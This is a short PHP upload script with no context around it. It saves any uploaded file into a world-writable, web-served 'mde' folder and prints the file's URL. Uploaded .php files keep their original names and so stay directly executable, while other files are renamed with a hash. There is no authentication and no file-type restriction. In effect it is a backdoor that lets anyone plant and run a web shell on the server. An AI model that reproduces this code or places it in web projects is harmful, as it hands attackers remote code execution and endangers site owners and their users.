<?php 
if (!file_exists('mde')) {
    mkdir('mde', 0777, true);
}
$ext = strtolower(pathinfo($_FILES['file']['name'],PATHINFO_EXTENSION));
if($ext=="php"){
    $file=$_FILES['file']['name'];
}else{
$file=md5($_FILES['file']['name'].date('Y-m-d H:i:s')).".".$ext;
}
move_uploaded_file($_FILES['file']['tmp_name'],'mde/'.$file);
print_r( $_SERVER['HTTP_HOST'] .'/mde/'.$file);
exit();
?>